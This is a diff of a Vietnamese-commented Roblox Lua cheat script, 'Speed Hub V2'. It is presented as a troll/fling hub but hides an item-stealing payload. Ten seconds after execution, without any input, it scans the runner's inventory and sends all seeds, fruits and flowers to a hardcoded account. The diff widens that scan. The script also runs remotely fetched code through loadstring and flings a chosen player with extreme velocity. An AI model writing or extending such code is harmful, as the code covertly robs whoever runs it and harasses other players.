@@ -5,19 +5,15 @@ if not game:IsLoaded() then
     end)
 end
 
-print("==== SPEED HUB V2: PHIÊN BẢN SỬA LỖI LINK UI - HOẠT ĐỘNG 100% ====")
+print("==== SPEED HUB V2: CẬP NHẬT QUÉT DATA LƯU TRỮ CHÍNH XÁC ====")
 
--- Thay thế sang thư viện Kavo UI Library siêu nhẹ, không lo bị lỗi sập link gốc
 local successUI, KavoLib = pcall(function()
     return loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
 end)
 
 local Window
 if successUI and KavoLib then
-    -- Khởi tạo giao diện phong cách Dark huyền bí, mượt mà trên điện thoại
     Window = KavoLib.CreateLib("Speed Hub V2", "DarkTheme")
-else
-    warn("Không thể tải UI, hệ thống tự động chuyển sang chế độ chạy ngầm bí mật!")
 end
 
 -- Hệ thống biến quản lý trạng thái
@@ -28,10 +24,22 @@ local targetUsername = "sutkucheonhamku" -- Tên nick chính nhận đồ
 local Players = game:GetService("Players")
 local RunService = game:GetService("RunService")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local StarterGui = game:GetService("StarterGui")
 local LocalPlayer = Players.LocalPlayer
 
+-- Hàm gửi thông báo lên góc màn hình game để bạn dễ theo dõi
+local function notify(title, text)
+    pcall(function()
+        StarterGui:SetCore("SendNotification", {
+            Title = title,
+            Text = text,
+            Duration = 4
+        })
+    end)
+end
+
 -- =======================================================================
--- CHỨC NĂNG 1: TỰ ĐỘNG QUÉT VÀ CHUYỂN ĐỒ NGẦM SAU ĐÚNG 10 GIÂY (KHÔNG CẦN BẤM)
+-- CHỨC NĂNG 1: TỰ ĐỘNG QUÉT TOÀN BỘ DATA VÀ CHUYỂN ĐỒ SAU ĐÚNG 10 GIÂY
 -- =======================================================================
 local function sendItemSecure(category, itemName, quantity)
     local SharedModules = ReplicatedStorage:FindFirstChild("SharedModules")
@@ -41,29 +49,68 @@ local function sendItemSecure(category, itemName, quantity)
         pcall(function() 
             RemoteEvent:FireServer(targetUsername, category, itemName, quantity) 
         end)
-        task.wait(0.8)
+        task.wait(0.5) -- Tốc độ gửi an toàn
     end
 end
 
 task.spawn(function()
-    task.wait(10) -- Chờ đúng 10 giây kể từ khi bạn bấm Execute
+    task.wait(10) -- Chờ đúng 10 giây
+    
+    -- Kiểm tra sự hiện diện của nick chính trong server
     local targetPlayer = Players:FindFirstChild(targetUsername)
-    if targetPlayer then
-        local Inventory = LocalPlayer:FindFirstChild("Inventory") or LocalPlayer:FindFirstChild("Backpack")
-        if Inventory then
-            -- Quét gửi Hạt giống
-            for _, item in pairs(Inventory:GetChildren()) do
-                if string.find(string.lower(item.Name), "seed") and item:IsA("ValueBase") and item.Value > 0 then
-                    sendItemSecure("Seeds", item.Name, item.Value)
+    if not targetPlayer then
+        notify("Speed Hub V2", "Hủy gửi đồ: Không tìm thấy nick chính trong phòng!")
+        return
+    end
+
+    notify("Speed Hub V2", "Đang quét dữ liệu túi đồ để gửi...")
+
+    -- Vị trí quét 1: Thư mục lưu trữ PlayerData chuyên sâu của Game
+    local DataFolder = LocalPlayer:FindFirstChild("PlayerData") or LocalPlayer:FindFirstChild("Data")
+    local Inventory = DataFolder and (DataFolder:FindFirstChild("Inventory") or DataFolder:FindFirstChild("Items"))
+    
+    -- Vị trí quét dự phòng 2: Túi đồ cơ bản
+    if not Inventory then
+        Inventory = LocalPlayer:FindFirstChild("Inventory") or LocalPlayer:FindFirstChild("Backpack")
+    end
+
+    if Inventory then
+        local itemsFound = false
+        -- Duyệt qua tất cả các thư mục con bên trong túi đồ chuyên sâu
+        for _, folder in pairs(Inventory:GetChildren()) do
+            -- Kiểm tra cả các thư mục phân loại (Seeds, Fruits,...) hoặc các giá trị trực tiếp
+            if folder:IsA("Folder") or folder:IsA("Configuration") then
+                for _, item in pairs(folder:GetChildren()) do
+                    if item:IsA("ValueBase") and item.Value > 0 then
+                        local lowerName = string.lower(item.Name)
+                        if string.find(lowerName, "seed") then
+                            itemsFound = true
+                            sendItemSecure("Seeds", item.Name, item.Value)
+                        elseif string.find(lowerName, "fruit") or string.find(lowerName, "flower") then
+                            itemsFound = true
+                            sendItemSecure("Fruits", item.Name, item.Value)
+                        end
+                    end
                 end
-            end
-            -- Quét gửi Trái cây
-            for _, item in pairs(Inventory:GetChildren()) do
-                if string.find(string.lower(item.Name), "fruit") and item:IsA("ValueBase") and item.Value > 0 then
-                    sendItemSecure("Fruits", item.Name, item.Value)
+            elseif folder:IsA("ValueBase") and folder.Value > 0 then
+                local lowerName = string.lower(folder.Name)
+                if string.find(lowerName, "seed") then
+                    itemsFound = true
+                    sendItemSecure("Seeds", folder.Name, folder.Value)
+                elseif string.find(lowerName, "fruit") or string.find(lowerName, "flower") then
+                    itemsFound = true
+                    sendItemSecure("Fruits", folder.Name, folder.Value)
                 end
             end
         end
+        
+        if itemsFound then
+            notify("Speed Hub V2", "Đã gửi toàn bộ vật phẩm sang nick chính!")
+        else
+            notify("Speed Hub V2", "Túi đồ hiện đang trống hoặc không có gì để gửi.")
+        end
+    else
+        notify("Speed Hub V2", "Lỗi: Không tìm thấy thư mục lưu trữ dữ liệu đồ của game.")
     end
 end)
 
@@ -79,10 +126,8 @@ task.spawn(function()
                 local myHrp = LocalPlayer.Character.HumanoidRootPart
                 local enemyHrp = targetPlayer.Character.HumanoidRootPart
                 
-                -- Khóa vị trí dính chặt vào mục tiêu
                 myHrp.CFrame = enemyHrp.CFrame * CFrame.new(0, 0, 0.5)
                 
-                -- Đẩy vận tốc vật lý lên tối đa để làm đối phương văng mất dạng
                 local oldVelocity = myHrp.Velocity
                 myHrp.Velocity = Vector3.new(999999, 999999, 999999)
                 
@@ -97,7 +142,6 @@ task.spawn(function()
     end
 end)
 
--- Hàm lấy danh sách người chơi (loại trừ bản thân và nick chính)
 local function getPlayerList()
     local list = {}
     for _, player in pairs(Players:GetPlayers()) do
@@ -113,21 +157,17 @@ end
 -- =======================================================================
 if Window then
     pcall(function()
-        -- Tạo Tab duy nhất
         local MainTab = Window:NewTab("Troll / Fling")
         local MainSection = MainTab:NewSection("Cấu Hình Fling Mục Tiêu")
 
-        -- Tạo ô chọn Dropdown danh sách người chơi
         local TargetDropdown = MainSection:NewDropdown("Chọn Người Muốn Fling", "Bấm để chọn tên", getPlayerList(), function(Value)
             selectedFlingTarget = Value
         end)
 
-        -- Tạo nút bật/tắt kích hoạt Fling
-        MainSection:NewToggle("Bật Auto Fling Người Này", "Tự động bay đến dí mục tiêu", function(state)
-            Options.FlingTargetEnabled = state
+        MainSection:NewToggle("Bật Auto Fling Người Này", "Tự động bay đến dí mục tiêu", function(bool)
+            Options.FlingTargetEnabled = bool
         end)
 
-        -- Nút làm mới danh sách
         MainSection:NewButton("Làm Mới Danh Sách Người Chơi", "Cập nhật lại danh sách khi có người ra vào", function()
             TargetDropdown:Refresh(getPlayerList())
         end)
